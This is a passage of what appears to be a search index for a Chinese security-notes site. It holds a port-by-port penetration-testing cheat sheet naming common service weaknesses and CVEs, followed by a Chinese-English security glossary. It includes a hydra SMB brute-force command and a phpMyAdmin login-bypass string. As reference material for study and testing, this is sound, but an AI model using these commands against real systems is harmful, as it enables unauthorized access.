547\uff1adhcpv6","title":"DHCP\uff1a\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_4","text":"DHCP\u6b3a\u9a97\uff1a \u6d41\u6c13DHCP\u670d\u52a1\u5668\u5185\u7f51\u653b\u51fb\u6d4b\u8bd5","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#dns","text":"53\uff1adns\uff08Domain Name System\u57df\u540d\u670d\u52a1\uff09","title":"DNS\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_5","text":"DNS\u7f13\u51b2\u533a\u6ea2\u51fa DNS\u6b3a\u9a97\uff1aDNS\u7f13\u5b58\u6c61\u67d3\u3001DNS\u52ab\u6301\u3001DNS\u91cd\u5b9a\u5411 DNS\u4fe1\u606f\u6cc4\u6f0f \u5229\u7528DNS\u96a7\u9053\u6280\u672f\u7a7f\u900f\u9632\u706b\u5899\uff1b \u533a\u57df\u4f20\u8f93\u6f0f\u6d1e\uff1b \u90ae\u4ef6\u672a\u914d\u7f6eSPF\u5bfc\u81f4\u53d1\u4ef6\u4eba\u4fe1\u606f\u4f2a\u9020\uff1b","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#linux-r","text":"512/tcp\uff1arexec 513/login\uff1arlogin","title":"Linux R\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_6","text":"\u76f4\u63a5\u767b\u5f55\uff1a Metasploitable2\u4f7f\u7528\u6307\u5357","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#rsync","text":"873\uff1arsync\uff08\u6587\u4ef6\u540c\u6b65\u534f\u8bae\uff09","title":"Rsync\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_7","text":"\u672a\u6388\u6743\u8bbf\u95ee","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#snmp","text":"161\uff1asnmp\uff08Simple Network Managerment Protocol\u7b80\u5355\u7f51\u7edc\u7ba1\u7406\u534f\u8bae\uff09 162\uff1asnmp\uff08SNMP\u534f\u8bae\u7684TRAP\u64cd\u4f5c\uff09","title":"SNMP\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_8","text":"\u66b4\u529b\u7834\u89e3","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#_9","text":"43\uff1awhois\uff08\uff09 49\uff1aTACACS\uff08\uff09 70\uff1aGopher\uff08\uff09 79\uff1aFinger\uff08\uff09 88/464\uff1aKerberos\uff08\uff09 123\uff1antp\uff08Network Time Protocol\u7f51\u7edc\u65f6\u95f4\u534f\u8bae\uff09 135\uff1aMicrosoft RPC 153\uff1aSGMP\uff08Simple Gateway Monitoring Protocol \u7b80\u5355\u7f51\u5173\u76d1\u63a7\u534f\u8bae\uff09 179\uff1aBGP\uff08Border Gateway Protocol \u8fb9\u754c\u7f51\u5173\u534f\u8bae\uff09 445\uff1aMicrosoft DS 264\uff1aBGMP\uff08Border Gateway Multicast Protocol \u8fb9\u754c\u7f51\u5173\u7ec4\u64ad\u534f\u8bae\uff09 514\uff1asyslog\uff08\u65e5\u5fd7\u670d\u52a1\uff09 631\uff1ainternet printing\uff08\u4e92\u8054\u7f51\u6253\u5370\u670d\u52a1\uff09 691\uff1aMS Exchange 1025\uff1aMicrosoft RPC 1080\uff1aSOCKS Proxy 1194\uff1aOpenVPN 1812/1813\uff1aRADIUS","title":"\u5176\u5b83\u7aef\u53e3"},{"location":"red_vs_blue/port/#_10","text":"","title":"\u5927\u6570\u636e\u670d\u52a1\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#cdh","text":"7180\uff1aCloudera Manager WebUI\u7aef\u53e3 7182\uff1aCloudera Manager Server\u4e0eAgent\u901a\u4fe1\u7aef\u53e3","title":"CDH\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#elasticsearch","text":"9200\uff1a\u5ba2\u6237\u7aef\u4f7f\u7528http\u8fde\u63a5es\u7684\u7aef\u53e3 9300\uff1a\u5ba2\u6237\u7aef\u4f7f\u7528tcp\u8fde\u63a5es\u7684\u7aef\u53e3","title":"ElasticSearch\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_11","text":"WebShell\u690d\u5165\uff1a \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff1a \u672a\u6388\u6743\u8bbf\u95ee\uff1a9200\u7aef\u53e3\u9ed8\u8ba4\u65e0\u8ba4\u8bc1\u4fe1\u606f\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6ES\u7684\u96c6\u7fa4\u4fe1\u606f\uff1b \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff1aCVE-2014-3120\u3001 CVE-2015-1427\uff1aElasticSearch Groovy\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#hadoop","text":"50070\uff1aHDFS\u7684WebUI\u7aef\u53e3 8020\uff1a\u9ad8\u53ef\u7528\u7684HDFS RPC\u7aef\u53e3 9000\uff1a\u975e\u9ad8\u53ef\u7528\u7684HDFS RPC\u7aef\u53e3 8088\uff1aYarn\u7684WebUI\u7aef\u53e3 8485\uff1aJournalNode\u7684RPC\u7aef\u53e3 8019\uff1aZKFC\u7aef\u53e3","title":"Hadoop\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_12","text":"CVE-2018-8029\uff1aApache Hadoop \u6743\u9650\u63d0\u5347\u6f0f\u6d1e Hadoop Yarn REST API\u672a\u6388\u6743\u6f0f\u6d1e\u5229\u7528\u6316\u77ff\u5206\u6790 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \u672a\u6388\u6743\u8bbf\u95ee\uff1a","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#hbase","text":"60010\uff1aHBase Master\u7684WebUI\u7aef\u53e3 60030\uff1aHBase RegionServer\u7684WebUI\u7aef\u53e3","title":"HBase\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_13","text":"","title":"\u6f0f\u6d1e\u6848\u4f8b"},{"location":"red_vs_blue/port/#_14","text":"","title":"\u4fee\u590d\u610f\u89c1"},{"location":"red_vs_blue/port/#hive","text":"9083\uff1aHive Metastore\u670d\u52a1\u9ed8\u8ba4\u76d1\u542c\u7aef\u53e3 10000\uff1aHive\u7684JDBC\u7aef\u53e3","title":"Hive\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_15","text":"","title":"\u6f0f\u6d1e\u6848\u4f8b"},{"location":"red_vs_blue/port/#_16","text":"","title":"\u4fee\u590d\u610f\u89c1"},{"location":"red_vs_blue/port/#hue","text":"8888\uff1aHue WebUI\u7aef\u53e3","title":"Hue\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_17","text":"","title":"\u6f0f\u6d1e\u6848\u4f8b"},{"location":"red_vs_blue/port/#_18","text":"","title":"\u4fee\u590d\u610f\u89c1"},{"location":"red_vs_blue/port/#kafka","text":"9092\uff1aKafka\u96c6\u7fa4\u8282\u70b9\u4e4b\u95f4\u901a\u4fe1\u7684RPC\u7aef\u53e3","title":"Kafka\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_19","text":"","title":"\u6f0f\u6d1e\u6848\u4f8b"},{"location":"red_vs_blue/port/#_20","text":"","title":"\u4fee\u590d\u610f\u89c1"},{"location":"red_vs_blue/port/#kibana","text":"5601\uff1aKibana","title":"Kibana"},{"location":"red_vs_blue/port/#memcache","text":"11211\uff1aMemcache\uff08\u5206\u5e03\u5f0f\u7684\u9ad8\u901f\u7f13\u5b58\u7cfb\u7edf\uff09","title":"Memcache\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_21","text":"\u672a\u6388\u6743\u8bbf\u95ee\uff1a Memcached\u670d\u52a1\u5b89\u5168\u52a0\u56fa","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#spark","text":"7077\uff1aSpark\u7684Master\u4e0eWorker\u8fdb\u884c\u901a\u4fe1\u7684\u7aef\u53e3\uff1bStandalone\u96c6\u7fa4\u63d0\u4ea4Application\u7684\u7aef\u53e3 8080\uff1aSpark Master\u7684WebUI\u7aef\u53e3 8081\uff1aSpark Worker\u7684WebUI\u7aef\u53e3 4040\uff1aSpark Driver\u7684WebUI\u7aef\u53e3 18080\uff1aSpark History Server\u7684WebUI\u7aef\u53e3","title":"Spark\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#zookeeper","text":"2181\uff1a\u5ba2\u6237\u7aef\u94fe\u63a5Zookeeper\u7684\u7aef\u53e3 2888\uff1aZookeeper\u96c6\u7fa4\u5185\u901a\u4fe1\u7aef\u53e3\uff0cLeader\u76d1\u542c\u6b64\u7aef\u53e3 3888\uff1aZookeeper\u9009\u4e3eLeader\u7aef\u53e3","title":"Zookeeper\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_22","text":"\u672a\u6388\u6743\u8bbf\u95ee","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#_23","text":"","title":"\u6570\u636e\u5e93\u670d\u52a1\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#db2","text":"5000\uff1a","title":"DB2\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_24","text":"\u5b89\u5168\u9650\u5236\u7ed5\u8fc7\u540e\u672a\u6388\u6743\u8bbf\u95ee\uff1aCVE-2015-1922","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#mongodb","text":"27017","title":"MongoDB\u6570\u636e\u5e93"},{"location":"red_vs_blue/port/#_25","text":"\u66b4\u529b\u7834\u89e3\uff1a \u672a\u6388\u6743\u8bbf\u95ee\uff1a mongodb_unauth_access \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff1a MongoDB phpMoAdmin\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#mssql","text":"1433/tcp\uff1aMicrosoft SQL\uff08MSSQL\u6570\u636e\u5e93\uff09 1434/tcp\uff1aMicrosoft SQL\uff08MSSQL\u6d3b\u52a8\u76d1\u89c6\u5668\uff09","title":"MSSQL\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_26","text":"\u66b4\u529b\u7834\u89e3\uff1a \u6743\u9650\u63d0\u5347\uff1a \u4ece\u653b\u51fbMSSQL Server\u5230\u83b7\u5f97\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#mysql","text":"3306\uff1aMySQL","title":"MySQL\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_27","text":"phpmyadmin\u4e07\u80fd\u5bc6\u7801\uff1a'localhost'@'@\"/\u5bc6\u7801\u4efb\u610f \u66b4\u529b\u7834\u89e3 \u62d2\u7edd\u670d\u52a1\u653b\u51fb \u6743\u9650\u63d0\u5347\uff1a MYSQL\u63d0\u6743\u603b\u7ed3 \u8eab\u4efd\u8ba4\u8bc1\u6f0f\u6d1e\uff1a CVE-2012-2122","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#oracle","text":"1521\uff1aOracle\u6570\u636e\u5e93\u7aef\u53e3 1158 8080 2100\uff1aOracle XDB 2483/2484\uff1aOralce DB","title":"Oracle\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_28","text":"\u66b4\u529b\u7834\u89e3\uff1a \u6f0f\u6d1e\u653b\u51fb","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#postgresql","text":"5432\uff1aPostgreSQL","title":"PostgreSQL\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_29","text":"\u66b4\u529b\u7834\u89e3\uff1a \u7f13\u51b2\u533a\u6ea2\u51fa\uff1aCVE-2014-2669","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#redis","text":"6379\uff1aRedis","title":"Redis\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_30","text":"\u66b4\u529b\u7834\u89e3\uff1a \u672a\u6388\u6743\u8bbf\u95ee\uff1a \u4e00\u8d77\u653b\u51fb\u8005\u5229\u7528Redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u8fdb\u884c\u65b0\u578b\u5165\u4fb5\u6316\u77ff\u4e8b\u4ef6","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#sysbase","text":"5000 4100 4200","title":"SysBase\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_31","text":"\u66b4\u529b\u7834\u89e3\uff1a \u547d\u4ee4\u6ce8\u5165\uff1a","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#_32","text":"","title":"\u6587\u4ef6\u670d\u52a1\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#ftp","text":"20\uff1aftp\uff08\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\u9ed8\u8ba4\u6570\u636e\uff09 21\uff1aftp\uff08\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\u63a7\u5236\uff09 69\uff1atftp\uff08\u5c0f\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff09 115\uff1asftp\uff08\u5b89\u5168\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff09 989\uff1aftp over ssl 990\uff1aftp over ssl","title":"FTP\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_33","text":"FTP \u540e\u95e8\uff1a Metasploitable2\u4f7f\u7528\u6307\u5357 \u66b4\u529b\u7834\u89e3\uff1ahydra\uff1b \u5c40\u57df\u7f51\u55c5\u63a2ftp\u5bc6\u7801\uff1b \u533f\u540d\u8bbf\u95ee\uff1aanonymous/\uff08\u4e3a\u7a7a\u6216\u4efb\u610f\u90ae\u7bb1\uff09\uff1b \u8df3\u8f6c\u653b\u51fb(Bounce Attacks)\uff1a\u653b\u51fb\u8005\u53d1\u9001\u4e00\u4e2aFTP\"PORT\"\u547d\u4ee4\u7ed9\u76ee\u6807FTP\u670d\u52a1\u5668\uff0c\u5176\u4e2d\u5305\u542b\u8be5\u4e3b\u673a\u7684\u7f51\u7edc\u5730\u5740\u548c\u88ab\u653b\u51fb\u7684\u670d\u52a1\u7684\u7aef\u53e3\u53f7\u3002\u8fd9\u6837\uff0c\u5ba2\u6237\u7aef\u5c31\u80fd\u547d\u4ee4FTP\u670d\u52a1\u5668\u53d1\u4e00\u4e2a\u6587\u4ef6\u7ed9\u88ab\u653b\u51fb\u7684\u670d\u52a1\u3002\u8fd9\u4e2a\u6587\u4ef6\u53ef\u80fd\u5305\u62ec\u6839\u88ab\u653b\u51fb\u7684\u670d\u52a1\u6709\u5173\u7684\u547d\u4ee4\uff08\u5982SMTP,NNTP\u7b49\uff09\u3002\u7531\u4e8e\u662f\u547d\u4ee4\u7b2c\u4e09\u65b9\u53bb\u8fde\u63a5\u5230\u4e00\u79cd\u670d\u52a1\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u8fde\u63a5\uff0c\u5c31\u4f7f\u5f97\u8ddf\u8e2a\u653b\u51fb\u8005\u53d8\u5f97\u56f0\u96be\uff0c\u5e76\u4e14\u8fd8\u907f\u5f00\u4e86\u57fa\u4e8e\u7f51\u7edc\u5730\u5740\u7684\u8bbf\u95ee\u9650\u5236\u3002 \u672a\u6388\u6743\u8bbf\u95ee\uff1a\u4e0d\u9700\u8981\u8d26\u53f7\u4e0e\u5bc6\u7801\uff1b \u8fdc\u7a0b\u6ea2\u51fa\uff1a6.10.1 IIS FTP\uff0c\u5728IIS FTP\u670d\u52a1\u5668\u4e2dNLST\u547d\u4ee4\u5b58\u5728\u4e00\u4e2a\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u53ef\u80fd\u662f\u653b\u51fb\u8005\u5728\u670d\u52a1\u5668\u8fd0\u884c\u4e00\u6761\u975e\u6cd5\u547d\u4ee4\u3002","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#ldap","text":"389\uff1aldap\uff08Lightweight Directory Access Protocol \u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff09 636\uff1aldap over ssl","title":"LDAP\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_34","text":"LDAP \u6ce8\u5165\uff1a \u66b4\u529b\u7834\u89e3\uff1a \u672a\u6388\u6743\u8bbf\u95ee\uff1a","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#nfs","text":"2049\uff1anfs\uff08network file system \u7f51\u7edc\u6587\u4ef6\u7cfb\u7edf\uff09","title":"NFS\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_35","text":"\u672a\u6388\u6743\u8bbf\u95ee\uff1a NFS\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#samba","text":"137\uff1aNetBIOS Name Service\uff0cNetBIOS\u540d\u79f0\u670d\u52a1\u7aef\u53e3 138\uff1aNetBIOS\u6570\u636e\u62a5\u6587\u670d\u52a1\u7aef\u53e3 139\uff1aNetBIOS Session Service\uff0cNetBIOS\u4f1a\u8bdd\u670d\u52a1\u7aef\u53e3","title":"Samba\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_36","text":"\u66b4\u529b\u7834\u89e3\uff1ahydra -l username -P pass_file attack_ip smb \u672a\u6388\u6743\u8bbf\u95ee\uff1a\u8d4b\u4e88public\u7528\u6237\u8fc7\u9ad8\u7684\u6743\u9650\uff1b \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff1aCVE-2015-0240\uff1b","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#_37","text":"","title":"\u90ae\u4ef6\u670d\u52a1\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#iamp","text":"143\uff1aiamp4\uff08\u56e0\u7279\u7f51\u4fe1\u606f\u8bbf\u95ee\u534f\u8bae\uff09 993\uff1aiamp4 over ssl","title":"IAMP\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_38","text":"\u66b4\u529b\u7834\u89e3 \u914d\u7f6e\u4e0d\u5f53","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#pop","text":"109\uff1apop2\uff08\u90ae\u5c40\u534f\u8baev2\uff09 110\uff1apop3\uff08\u90ae\u5c40\u534f\u8baev3\uff09 995\uff1apop3 over ssl","title":"POP\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_39","text":"\u66b4\u529b\u7834\u89e3 \u672a\u6388\u6743\u8bbf\u95ee","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#smtp","text":"25\uff1asmtp\uff08Simple Mail Transfer Protocol \u7b80\u5355\u90ae\u4ef6\u4f20\u8f93\u534f\u8bae\uff09 465\uff1asmtps\uff08smtp over ssl\uff09 587\uff1asmtp\uff08Simple Mail Transfer Protocol \u7b80\u5355\u90ae\u4ef6\u4f20\u8f93\u534f\u8bae\uff09","title":"SMTP\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_40","text":"\u66b4\u529b\u7834\u89e3 \u672a\u6388\u6743\u8bbf\u95ee","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#_41","text":"","title":"\u8fdc\u7a0b\u8bbf\u95ee\u670d\u52a1\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#microsoft-rdp","text":"3389\uff1aMicrosoft Terminal Server","title":"Microsoft RDP\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_42","text":"CVE-2019-0708\uff1a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c MS12-020\uff1a Shift\u7c98\u6ede\u952e\u540e\u95e8\uff0c5\u6b21Shift\uff1b \u66b4\u529b\u7834\u89e3","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#pcanywhere","text":"5631/5632\uff1apcAnywhere","title":"pcAnywhere\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_43","text":"\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \u62d2\u7edd\u670d\u52a1\u653b\u51fb \u6743\u9650\u63d0\u5347","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#ssh","text":"22\uff1assh\uff08\u8fdc\u7a0b\u767b\u5f55\u534f\u8bae\uff09","title":"SSH\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_44","text":"28\u9000\u683c\u6f0f\u6d1e\uff1a \u66b4\u529b\u7834\u89e3\uff1a \u5fc3\u810f\u6ef4\u8840\u6f0f\u6d1e\uff1a","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#telnet","text":"23\uff1atelnet\uff08\u7ec8\u7aef\u4eff\u771f\u534f\u8bae\uff09","title":"Telnet\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_45","text":"\u66b4\u529b\u7834\u89e3\uff1a \u5c40\u57df\u7f51\u55c5\u63a2\uff1a","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#vnc","text":"5500\uff1aVNC Server 590N\uff1aN\u662f\u4ece1\u52309\u7684\u6574\u6570\uff0c\u4ee3\u8868\u4e0d\u540c\u5230\u684c\u9762ID","title":"VNC\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_46","text":"\u66b4\u529b\u7834\u89e3 \u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff1aCVE-2015-5239 \u6743\u9650\u63d0\u5347\uff1aCVE-2013-6886 \u8ba4\u8bc1\u53e3\u4ee4\u7ed5\u8fc7","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#_47","text":"bloodzer0-\u7aef\u53e3\u6e17\u900f\u603b\u7ed3","title":"\u53c2\u8003\u8d44\u6599"},{"location":"security_notes/zh-en/","text":"\u5b89\u5168\u4e2d\u82f1\u6587\u5bf9\u5e94 \u82f1\u6587 \u4e2d\u6587 \u7b80\u79f0 access control decision function \u8bbf\u95ee\u63a7\u5236\u5224\u51b3\u529f\u80fd ADF access control decision information \u8bbf\u95ee\u63a7\u5236\u5224\u51b3\u4fe1\u606f ADI access control enforcement function \u8bbf\u95ee\u63a7\u5236\u5b9e\u65bd\u529f\u80fd AEF access control entries \u8bbf\u95ee\u63a7\u5236\u5165\u53e3 ACE access control information \u8bbf\u95ee\u63a7\u5236\u4fe1\u606f access control list \u8bbf\u95ee\u63a7\u5236\u5217\u8868 ACL account security \u8d26\u6237\u5b89\u5168 advance persistent threat \u9ad8\u7ea7\u6301\u7eed\u6027\u5a01\u80c1 APT agile development \u654f\u6377\u5f00\u53d1 anti-phishing project \u53cd\u9493\u9c7c\u9879\u76ee api security \u63a5\u53e3\u5b89\u5168 application programming interface \u5e94\u7528\u7f16\u7a0b\u63a5\u53e3 API artificial intelligent \u4eba\u5de5\u667a\u80fd AI assets management \u8d44\u4ea7\u7ba1\u7406 asynchronous transfer mode \u5f02\u6b65\u4f20\u8f93\u6a21\u5f0f attribute-based access control \u57fa\u4e8e\u5c5e\u6027\u7684\u8bbf\u95ee\u63a7\u5236\u6a21\u578b ABAC authentication authorization accounting \u8ba4\u8bc1\u3001\u6388\u6743\u3001\u8ba1\u5e10 3A authentication authorization accounting audit \u7edf\u4e00\u5b89\u5168\u7ba1\u7406\u5e73\u53f0\u89e3\u51b3\u65b9\u6848 4A back-end system \u540e\u7aef\u7cfb\u7edf border gateway protocol \u8fb9\u754c\u7f51\u5173\u534f\u8bae BGP bring your own device \u643a\u5e26\u81ea\u5df1\u7684\u529e\u516c\u8bbe\u5907 BYOD business assessment \u4e1a\u52a1\u8bc4\u4f30 BA business continuity institute \u4e1a\u52a1\u6301\u7eed\u6027\u534f\u4f1a BCI business continuity management \u4e1a\u52a1\u8fde\u7eed\u6027\u7ba1\u7406 BCM business continuity planning \u4e1a\u52a1\u8fde\u7eed\u6027\u8ba1\u5212 BCP business email compromise \u5546\u4e1a\u90ae\u4ef6\u5931\u9677 business impact assessment \u4e1a\u52a1\u5f71\u54cd\u8bc4\u4f30 BIA business security \u4e1a\u52a1\u5b89\u5168 captcha security \u9a8c\u8bc1\u7801\u5b89\u5168 capture the flag \u593a\u65d7\u8d5b CTF certificate \u8bc1\u4e66 CA chain of blocks \u533a\u5757\u94fe cloud access security broker \u4e91\u8bbf\u95ee\u5b89\u5168\u4ee3\u7406 CASB cloud security \u4e91\u5b89\u5168 cloud security posture management \u4e91\u5b89\u5168\u914d\u7f6e\u7ba1\u7406 CSPM cloud workload protection platforms \u4e91\u5de5\u4f5c\u8d1f\u8f7d\u4fdd\u62a4\u5e73\u53f0 CWPP code audit \u4ee3\u7801\u5ba1\u8ba1 common body of knowledge \u901a\u7528\u77e5\u8bc6\u534f\u8bae CBK complex event process \u590d\u6742\u4e8b\u4ef6\u9a71\u52a8 CEP confidentiality integrity availability \u4fdd\u5bc6\u6027 \u5b8c\u6574\u6027 \u53ef\u7528\u6027 CIA container security \u5bb9\u5668\u5b89\u5168 content disarm and reconstruction \u5185\u5bb9\u62c6\u89e3\u4e0e\u91cd\u5efa continuous delivery or development \u6301\u7eed\u4ea4\u4ed8\u6216\u90e8\u7f72 CD continuous integration \u6301\u7eed\u96c6\u6210 CI cryptography \u5bc6\u7801\u5b66 cyber security \u7f51\u7edc\u7a7a\u95f4\u5b89\u5168 data encryption standard \u6570\u636e\u52a0\u5bc6\u6807\u51c6 DES data lifecycle management \u6570\u636e\u751f\u547d\u5468\u671f\u7ba1\u7406 DLM data loss prevention \u6570\u636e\u4e22\u5931\u4fdd\u62a4 DLP data mining \u6570\u636e\u6316\u6398 data security \u6570\u636e\u5b89\u5168 denial of service \u62d2\u7edd\u670d\u52a1 DoS deception \u6b3a\u9a97\u6280\u672f development security operations DevSecOps disaster recovery planning \u707e\u96be\u6062\u590d\u8ba1\u5212 DRP discretionary access control \u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236 DAC distributed denial of service \u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1 DDoS domain name system \u57df\u540d\u670d\u52a1 DNS elastic and scalable \u5f39\u6027\u53ef\u4f38\u7f29 elastic computing \u5f39\u6027\u8ba1\u7b97 endpoint detection and response \u7ec8\u7aef\u68c0\u6d4b\u4e0e\u54cd\u5e94 EDR endpoint protection platform \u7ec8\u7aef\u9632\u62a4\u5e73\u53f0 EPP endpoint security \u7ec8\u7aef\u5b89\u5168 enterprise mobility management \u4f01\u4e1a\u79fb\u52a8\u7ba1\u7406 EMM enterprise resource planning \u4f01\u4e1a\u8d44\u6e90\u8ba1\u5212 ERP enterprise risk management \u4f01\u4e1a\u98ce\u9669\u7ba1\u7406 ERM extraction transformation loading \u63d0\u53d6 \u8f6c\u5316 \u52a0\u8f7d ETL file transfer protocol \u6587\u4ef6\u4f20\u8f93\u534f\u8bae FTP firewall \u9632\u706b\u5899 free computing \u81ea\u7531\u8ba1\u7b97 front-end system \u524d\u7aef\u7cfb\u7edf general data protection regulation \u4e00\u822c\u6570\u636e\u4fdd\u62a4\u6761\u4f8b GDPR governance risk and compliance \u6cbb\u7406\u98ce\u9669\u4e0e\u5408\u89c4\u6027 high availability \u9ad8\u53ef\u7528\u6027 HA human computer interaction \u4eba\u673a\u4ea4\u4e92 HCI human machine interface \u4eba\u673a\u754c\u9762 HMI identify access management \u8eab\u4efd\u8bc6\u522b\u4e0e\u8bbf\u95ee\u63a7\u5236 IAM incident response \u4e8b\u4ef6\u54cd\u5e94 industrial control system \u5de5\u4e1a\u63a7\u5236\u7cfb\u7edf ICS information technology infrastructural library IT\u57fa\u7840\u7ed3\u6784 ITIL infrastructure security \u57fa\u7840\u8bbe\u65bd\u5b89\u5168 internet of things \u7269\u8054\u7f51 IOT intrusion detection system \u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf IDS intrusion prevention system \u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf IPS load balancing \u8d1f\u8f7d\u5747\u8861 log analysis \u65e5\u5fd7\u5206\u6790 managed detection and response \u53ef\u7ba1\u7406\u68c0\u6d4b\u4e0e\u54cd\u5e94 MDR mandatory access control \u5f3a\u5236\u8bbf\u95ee\u63a7\u5236 MAC maximum tolerable downtime \u6700\u957f\u505c\u673a\u65f6\u95f4 MTD maximum tolerable period disruption \u6700\u957f\u4e2d\u65ad\u65f6\u95f4 MTPD mean time between failure \u5e73\u5747\u6545\u969c\u65f6\u95f4\u95f4\u9694 MTBF mean time to repair \u5e73\u5747\u4fee\u590d\u65f6\u95f4 MTTR mobile application management \u79fb\u52a8\u5e94\u7528\u7ba1\u7406 MAM mobile content management \u79fb\u52a8\u5185\u5bb9\u7ba1\u7406 MCM mobile device management \u79fb\u52a8\u8bbe\u5907\u7ba1\u7406 MDM monitoring \u76d1\u63a7 multi factor authentication \u591a\u56e0\u7d20\u8ba4\u8bc1 MFA network access control 